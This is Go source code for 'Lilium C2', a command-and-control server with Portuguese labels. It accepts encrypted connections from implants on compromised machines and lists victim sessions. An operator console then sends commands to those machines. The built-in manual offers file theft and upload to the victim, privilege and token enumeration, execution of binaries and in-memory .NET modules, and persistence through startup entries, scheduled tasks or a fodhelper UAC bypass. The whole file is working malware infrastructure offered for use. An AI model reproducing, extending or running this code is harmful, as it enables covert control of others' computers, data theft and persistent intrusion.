package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

type Session struct {
	ID         string
	Conn       net.Conn
	AESKey     []byte
	Info       map[string]interface{}
	RemoteAddr string
}

var (
	sessions = make(map[string]*Session)
	mu       sync.Mutex
)

const banner = "\033[35m" + `
                            ⠘⣷
                  ⢀⣤⣤⣤⣀⡀⠄⠄⠄⢸⡀
                   ⠙⠻⣗⢭⡙⠳⣦⡀⠘⡇⠄⠄⠄⣴⠇
                     ⠈⢷⡌⠣⡄⠄⢰⡇⠄⠄⡴⠁
             ⣠⣴⣞⣛⣛⡛⠛⠛⠶⠄⢻⡆⠉⠄⢸⠄⢀⡜⠁⠄⠛⠛⠻⢦⣄
            ⣼⠛⠛⠳⠶⣦⣍⠙⠲⢤⠄⠄⣿⠄⠄⡏⢠⠎⠄⣀⡤⠤⠒⠶⠂⠙⣧⡀
            ⢿⡄⣿⠄⠄⠄⠉⢻⣄⣀⠄⠄⠛⠄⠸⠡⢋⡴⠊⢁⣠⣤⣶⣶⢤⣄⡘⣇
            ⠙⠻⠆⣠⡶⠟⠋⠉⠉⠛⢶⣶⠖⠶⣦⡀⠠⣴⣯⣁⠄⠄⠙⢷⡈⠻⣿
               ⣰⠏⢀⣋⣉⠉⠉⠲⡄⠙⣧⠄⠈⢃⣀⠄⠄⠉⠳⣄⠄⠈⣷⢀⡟
               ⣿⠟⣿⠋⠉⠛⠷⡄⠸⠄⢹⡖⠛⠉⠉⠙⣷⣦⡀⢹⡆⠄⣿⡾⠁
               ⢿⡄⢿⡀⠄⠄⠄⢰⣆⠄⠛⠄⢠⡆⠄⠄⠸⡏⢻⣼⡇⠄⠋
                ⠻⣮⣷⡀⠄⠄⠄⠙⠶⣤⠶⠟⠁⠄⠄⢸⡇⢀⡿⠁
                  ⠉⠛⠁⠄⠄⠄⠄⣿⠄⠄⠄⠄⣠⣿⡴⠛
                     ⣠⣤⣤⣄⡀⣿    ⠉
                 ⢀⣴⠟⠉⣠⠶⠿⠿⣿
              ⢀⣀⣴⠟⢁⣴⠟⠁   ⣿
             ⠙⠿⣭⣤⡴⠟⠁     ⣿
` + "\033[m"

func generateSessionID() string {
	b := make([]byte, 4)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func encryptAES(key []byte, plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func decryptAES(key []byte, ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext curto")
	}
	nonce, cipherdata := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, cipherdata, nil)
}

func handleClient(conn net.Conn, addr net.Addr) {
	defer conn.Close()

	privKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return
	}
	pubKeyBytes := elliptic.Marshal(elliptic.P256(), privKey.PublicKey.X, privKey.PublicKey.Y)

	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		return
	}

	clientPubX, clientPubY := elliptic.Unmarshal(elliptic.P256(), buf[:n])
	if clientPubX == nil {
		return
	}

	conn.Write(pubKeyBytes)

	x, _ := elliptic.P256().ScalarMult(clientPubX, clientPubY, privKey.D.Bytes())
	aesKey := x.Bytes()
	if len(aesKey) > 32 {
		aesKey = aesKey[len(aesKey)-32:]
	} else if len(aesKey) < 32 {
		padded := make([]byte, 32)
		copy(padded[32-len(aesKey):], aesKey)
		aesKey = padded
	}

	lenBuf := make([]byte, 4)
	_, err = io.ReadFull(conn, lenBuf)
	if err != nil {
		return
	}
	dataLen := uint32(lenBuf[0])<<24 | uint32(lenBuf[1])<<16 | uint32(lenBuf[2])<<8 | uint32(lenBuf[3])

	encData := make([]byte, dataLen)
	_, err = io.ReadFull(conn, encData)
	if err != nil {
		return
	}

	decData, err := decryptAES(aesKey, encData)
	if err != nil {
		return
	}

	var info map[string]interface{}
	json.Unmarshal(decData, &info)

	sid := generateSessionID()
	sess := &Session{
		ID:         sid,
		Conn:       conn,
		AESKey:     aesKey,
		Info:       info,
		RemoteAddr: addr.String(),
	}

	mu.Lock()
	sessions[sid] = sess
	mu.Unlock()

	fmt.Printf("\n\033[32m[+] Nova sessão estabelecida: ID %s [%s]\033[m\n", sid, addr.String())

	for {
		lenHeader := make([]byte, 4)
		_, err := io.ReadFull(conn, lenHeader)
		if err != nil {
			break
		}
		packetLen := uint32(lenHeader[0])<<24 | uint32(lenHeader[1])<<16 | uint32(lenHeader[2])<<8 | uint32(lenHeader[3])

		packetBytes := make([]byte, packetLen)
		_, err = io.ReadFull(conn, packetBytes)
		if err != nil {
			break
		}

		plain, err := decryptAES(aesKey, packetBytes)
		if err != nil {
			continue
		}

		msg := string(plain)
		if msg != "[ping]" && msg != "" {
			fmt.Printf("\n%s\n", msg)
		}
	}

	mu.Lock()
	delete(sessions, sid)
	mu.Unlock()
	fmt.Printf("\n\033[31m[-] Sessão %s encerrada.\033[m\n", sid)
}

func (s *Session) sendCommand(cmd string) error {
	cipherData, err := encryptAES(s.AESKey, []byte(cmd))
	if err != nil {
		return err
	}
	l := uint32(len(cipherData))
	header := []byte{byte(l >> 24), byte(l >> 16), byte(l >> 8), byte(l)}
	s.Conn.Write(header)
	s.Conn.Write(cipherData)
	return nil
}

func printSessions() {
	mu.Lock()
	defer mu.Unlock()
	fmt.Println("+----------+-------------------------+-------------------+-----------------+----------------+")
	fmt.Println("|    ID    |           IP            |     Hostname      |     Usuário     |       OS       |")
	fmt.Println("+----------+-------------------------+-------------------+-----------------+----------------+")
	for id, s := range sessions {
		host := fmt.Sprintf("%v", s.Info["hostname"])
		user := fmt.Sprintf("%v", s.Info["username"])
		osName := fmt.Sprintf("%v", s.Info["os"])
		if len(host) > 17 { host = host[:17] }
		if len(user) > 15 { user = user[:15] }
		if len(osName) > 14 { osName = osName[:14] }
		fmt.Printf("| %-8s | %-23s | %-17s | %-15s | %-14s |\n", id, s.RemoteAddr, host, user, osName)
	}
	fmt.Println("+----------+-------------------------+-------------------+-----------------+----------------+")
}

func printHelpMenu() {
	fmt.Println("\n========================= [ LILIUM C2 - MANUAL DE COMANDOS ] =========================")
	fmt.Println("  SISTEMA E ARQUIVOS")
	fmt.Println("       pwd                       - Exibe o diretório atual de trabalho")
	fmt.Println("       cd <pasta>                - Altera o diretório atual")
	fmt.Println("       dir / ls                  - Lista arquivos e pastas no diretório")
	fmt.Println("       cat / type <arq>          - Exibe o conteúdo de um arquivo de texto")
	fmt.Println("       rm <arq>                  - Remove um arquivo do disco")
	fmt.Println("       download <arq>            - Baixa um arquivo da vítima para o servidor C2")
	fmt.Println("       upload <local> <remoto>   - Envia um arquivo do C2 para a máquina vítima")
	fmt.Println("\n  ENUMERAÇÃO DE HOST E TOKEN")
	fmt.Println("       hostname                  - Exibe o nome do host atual (Nativo)")
	fmt.Println("       env                       - Lista variáveis de ambiente (Nativo)")
	fmt.Println("       ipconfig                  - Exibe interfaces e endereços de rede (Nativo)")
	fmt.Println("       whoami                    - Exibe o contexto atual de usuário")
	fmt.Println("       privs                     - Lista privilégios do token atual (Nativo)")
	fmt.Println("       groups                    - Lista os grupos do token atual (Nativo)")
	fmt.Println("\n  EXECUÇÃO CONTROLADA & MÓDULOS")
	fmt.Println("       exec <binario> [args]     - Executa binário via Fork&Run com pipes redirecionados")
	fmt.Println("       modules list              - Lista os módulos disponíveis na pasta modules/")
	fmt.Println("       modules run <nome> [args] - Executa módulo (.NET in-memory ou .exe nativo)")
	fmt.Println("\n  PERSISTÊNCIA E CONTROLE")
	fmt.Println("       persist <startup|taskscheduler|fodhelper> - Aplica persistência escolhida")
	fmt.Println("       exit / back               - Sai da sessão interativa atual")
	fmt.Println("=======================================================================================")
}

func handleModulesCommand(sess *Session, cmdArgs string) {
	parts := strings.Fields(cmdArgs)
	if len(parts) == 0 || parts[0] == "list" {
		files, err := os.ReadDir("modules")
		if err != nil {
			fmt.Println("[-] Pasta 'modules/' não encontrada no servidor. Crie-a.")
			return
		}
		fmt.Println("\n[+] Módulos Disponíveis na Pasta 'modules/':")
		fmt.Println("----------------------------------------")
		for _, f := range files {
			if !f.IsDir() {
				fmt.Printf(" - %s\n", f.Name())
			}
		}
		fmt.Println("----------------------------------------")
		fmt.Println("Uso: modules run <nome_do_modulo> [args]")
		return
	}

	if parts[0] == "run" {
		if len(parts) < 2 {
			fmt.Println("[-] Uso: modules run <nome_do_modulo> [args]")
			return
		}
		modName := parts[1]
		modPath := filepath.Join("modules", modName)

		fileBytes, err := os.ReadFile(modPath)
		if err != nil {
			fmt.Printf("[-] Erro ao ler módulo '%s': %v\n", modName, err)
			return
		}

		var argsStr string
		if len(parts) > 2 {
			argsStr = strings.Join(parts[2:], " ")
		}

		payloadMap := map[string]string{
			"name": modName,
			"args": argsStr,
			"data": base64.StdEncoding.EncodeToString(fileBytes),
		}
		payloadBytes, _ := json.Marshal(payloadMap)
		sess.sendCommand("run_module " + string(payloadBytes))
		fmt.Printf("[*] Módulo '%s' despachado para a sessão. Aguardando execução...\n", modName)
	}
}

func interactiveShell(sid string) {
	mu.Lock()
	sess, exists := sessions[sid]
	mu.Unlock()

	if !exists {
		fmt.Println("[-] Sessão não encontrada.")
		return
	}

	fmt.Printf("[*] Entrando na sessão %s. Digite 'help' para ver o manual.\n", sid)
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Printf("lilium (%s) > ", sid)
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimSpace(cmd)
		if cmd == "" {
			continue
		}
		if cmd == "exit" || cmd == "back" {
			fmt.Println("[*] Saindo da sessão...")
			break
		}
		if cmd == "help" {
			printHelpMenu()
			continue
		}

		if strings.HasPrefix(cmd, "modules") {
			modArgs := strings.TrimSpace(strings.TrimPrefix(cmd, "modules"))
			handleModulesCommand(sess, modArgs)
			continue
		}

		if strings.HasPrefix(cmd, "upload ") {
			parts := strings.Fields(cmd)
			if len(parts) < 3 {
				fmt.Println("[-] Uso correto: upload <arquivo_local> <caminho_remoto>")
				continue
			}
			localPath := parts[1]
			remotePath := parts[2]

			fileBytes, err := os.ReadFile(localPath)
			if err != nil {
				fmt.Printf("[-] Erro ao ler arquivo local: %v\n", err)
				continue
			}

			payloadMap := map[string]string{
				"path": remotePath,
				"data": base64.StdEncoding.EncodeToString(fileBytes),
			}
			payloadBytes, _ := json.Marshal(payloadMap)
			sess.sendCommand("upload_payload " + string(payloadBytes))
			continue
		}

		sess.sendCommand(cmd)
		time.Sleep(600 * time.Millisecond)
	}
}

func main() {
	os.MkdirAll("modules", 0755)

	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
	if err != nil {
		fmt.Println("[!] Erro ao carregar certificado TLS. Certifique-se de gerar cert.pem e key.pem.")
		panic(err)
	}

	config := &tls.Config{Certificates: []tls.Certificate{cert}}
	listener, err := tls.Listen("tcp", "0.0.0.0:443", config)
	if err != nil {
		panic(err)
	}
	defer listener.Close()

	fmt.Println(banner)
	fmt.Println("[+] Servidor Lilium C2 iniciado na porta 443 (TLS + ECDH)")

	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				continue
			}
			go handleClient(conn, conn.RemoteAddr())
		}
	}()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("lilium-server> ")
		if !scanner.Scan() {
			break
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "sessions" {
			printSessions()
		} else if strings.HasPrefix(line, "use ") {
			sid := strings.TrimSpace(strings.TrimPrefix(line, "use "))
			interactiveShell(sid)
		} else if line == "exit" {
			fmt.Println("[*] Saindo...")
			os.Exit(0)
		} else {
			fmt.Println("Comandos disponíveis: sessions, use <id>, exit")
		}
	}
}
